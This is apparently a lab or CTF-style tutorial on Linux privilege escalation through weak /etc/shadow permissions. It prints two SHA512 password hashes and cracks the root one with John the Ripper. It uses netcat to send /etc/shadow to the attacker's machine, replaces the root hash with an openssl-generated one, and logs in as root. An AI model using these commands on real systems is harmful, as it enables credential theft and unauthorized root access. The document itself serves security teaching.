**Weak File Permissions**

<img width="1080" height="469" alt="image" src="https://github.com/user-attachments/assets/7fc91d00-8007-4247-bb54-73e97d901f1e" />

We will talk about 3 files here.

/etc/passwd → This file contains all the usernames. From this file linux verifies what users are there on the machine. 

/etc/shadow → This file contains password of all the users on the system. Passwords are stored in hashes. 

/etc/sudoers → This files tell which users has how much right on command 'sudo'.


Lets start with /etc/shadow

<img width="757" height="139" alt="image" src="https://github.com/user-attachments/assets/ba3fa094-ede7-4b0f-a676-69ed1c3d58da" />

We have both read and write permission on this file.

Case 1) Lets assume that we have only read permission on /etc/shadow file.

Here we can see that other users has read and write permissions on the file.

<img width="1080" height="437" alt="image" src="https://github.com/user-attachments/assets/e2989445-e314-417c-90f0-633a459f2f3b" />

Here two users are there. Root and user. There are passwords as well for the users. These passwords are encrypted in SHA512 Crypt. 

Lets copy the hash and try to crack it.

TIP:- Password is between : and :

root --> $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0

user --> $6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.

Now we will use John the Ripper to crack the hash. We need to put the hash in a file first.

echo 'hash' > filename

<img width="1080" height="145" alt="image" src="https://github.com/user-attachments/assets/868709fa-ef51-4e39-9d10-0b56305e2511" />

john hash_root - wordlist=/usr/share/wordlists/rockyou.txt

<img width="1080" height="319" alt="image" src="https://github.com/user-attachments/assets/eb99f06f-57ff-4195-b764-31ac093d2dd2" />

Password for root user is password123

Lets login as root user

<img width="1080" height="196" alt="image" src="https://github.com/user-attachments/assets/5dca27e5-14aa-4302-a4c2-4b80a52394fd" />

And we have root access !!!

Case 2) If we have read and write permission on /etc/shadow

Now if we have write permission on this file, we can modify or delete hash of any user. 

We can change the hash of root user with any other password hash that we know. 

Lets transfer this file to our local machine.

We will start a nc listner on target machine

nc -nvlp 4444 < /etc/shadow

<img width="736" height="112" alt="image" src="https://github.com/user-attachments/assets/6dfb2e0b-d354-4f76-a1c8-f93f9b5fd315" />

Now, any connection that will make to this machine, /etc/shadow file will be copied. 

Lets create a connection on our machine. 

nc 10.48.156.147 4444 > shadow

10.48.156.147 is the machine IP from where we want to copy the file.

shadow is the filename.

Target machine
<img width="895" height="178" alt="image" src="https://github.com/user-attachments/assets/51f74d86-371c-4254-a83e-5c0962e2861c" />

Kali (our) machine
<img width="895" height="157" alt="image" src="https://github.com/user-attachments/assets/936e6966-49f1-4e51-a689-cd1a0d02d238" />

File has been copied in our machine
<img width="1080" height="152" alt="image" src="https://github.com/user-attachments/assets/cc8cec30-3647-4f6b-89ac-2e7d4fb33822" />

<img width="1080" height="350" alt="image" src="https://github.com/user-attachments/assets/80096f17-689a-4239-8380-57f32e3cc505" />

Now we will change the hash of root with another hash. The hash should be SHA512 Crypt.

<img width="1080" height="155" alt="image" src="https://github.com/user-attachments/assets/a17910d0-5782-4683-8212-710bdf5eedf8" />

openssl passwd -6 hello

*) passwd >> keyword to create a password.

*) 6 >> for SHA512 Cryot.

*) hello >> the password for which we want to create hash.

Now we will replace the root hash with this one.

<img width="1080" height="209" alt="image" src="https://github.com/user-attachments/assets/0afa15cc-e31c-47ae-8644-ab83358accbf" />

Now we will transfer this file to the target machine.

Lets start a listener on target machine
<img width="979" height="124" alt="image" src="https://github.com/user-attachments/assets/4f2beeb9-966e-401f-bc57-b6e3607895c9" />

On our machine
<img width="817" height="150" alt="image" src="https://github.com/user-attachments/assets/516db4a3-5326-439e-b848-d0e4ad503a18" />

File has been transferred.
<img width="951" height="129" alt="image" src="https://github.com/user-attachments/assets/0f3b7653-bdfa-4fea-9660-0faa15b16c40" />

Lets verify the new hash
<img width="1080" height="203" alt="image" src="https://github.com/user-attachments/assets/99b08bee-b437-4c72-baf4-df32727ea4d8" />

Lets try to login as root with password hello
<img width="736" height="138" alt="image" src="https://github.com/user-attachments/assets/da145149-969f-4459-8064-3ffa5c6adf22" />

And we are root user !!!
